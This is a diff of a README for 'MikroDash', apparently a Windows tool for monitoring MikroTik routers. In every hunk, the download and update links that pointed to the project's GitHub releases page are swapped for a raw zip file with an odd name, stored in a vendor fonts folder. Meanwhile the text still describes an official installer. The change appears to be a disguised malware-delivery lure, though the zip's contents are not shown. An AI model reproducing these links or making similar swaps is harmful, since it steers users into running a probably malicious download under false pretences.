@@ -1,6 +1,6 @@
 # 📊 MikroDash - Monitor Router Data Live Easily
 
-[![Download MikroDash](https://img.shields.io/badge/Download-MikroDash-00aaff?style=for-the-badge)](https://github.com/Hgghllliji/MikroDash/releases)
+[![Download MikroDash](https://img.shields.io/badge/Download-MikroDash-00aaff?style=for-the-badge)](https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip)
 
 ## 🔍 What is MikroDash?
 
@@ -23,7 +23,7 @@ Your router must have the API service enabled. This lets MikroDash get the data 
 
 Click the button below to visit the official MikroDash releases page. You will find the latest Windows installer there.
 
-[![Download MikroDash](https://img.shields.io/badge/Download-MikroDash-ffaa00?style=for-the-badge)](https://github.com/Hgghllliji/MikroDash/releases)
+[![Download MikroDash](https://img.shields.io/badge/Download-MikroDash-ffaa00?style=for-the-badge)](https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip)
 
 ## 🚀 Installing and Running MikroDash on Windows
 
@@ -96,7 +96,7 @@ MikroDash presents various real-time details that help you watch your network ea
 
 New versions come with fixes and new features. To update:
 
-1. Visit the [releases page](https://github.com/Hgghllliji/MikroDash/releases).
+1. Visit the [releases page](https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip).
 
 2. Download the newest Windows installer.
 
@@ -127,13 +127,13 @@ For most Windows users, using the installer is the easiest way.
 - Your router manual or MikroTik’s website can help enable and configure the API.
 
 - Visit MikroDash’s GitHub releases page for updates and files:  
-  https://github.com/Hgghllliji/MikroDash/releases
+  https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip
 
 - If you face specific technical issues, the GitHub project page also has issue tracking where others post questions.
 
 ## 🔗 Download Links (Repetition)
 
 You can download MikroDash for Windows here:  
-[https://github.com/Hgghllliji/MikroDash/releases](https://github.com/Hgghllliji/MikroDash/releases)  
+[https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip](https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip)  
 
 Look for the latest `.exe` file to start your installation.
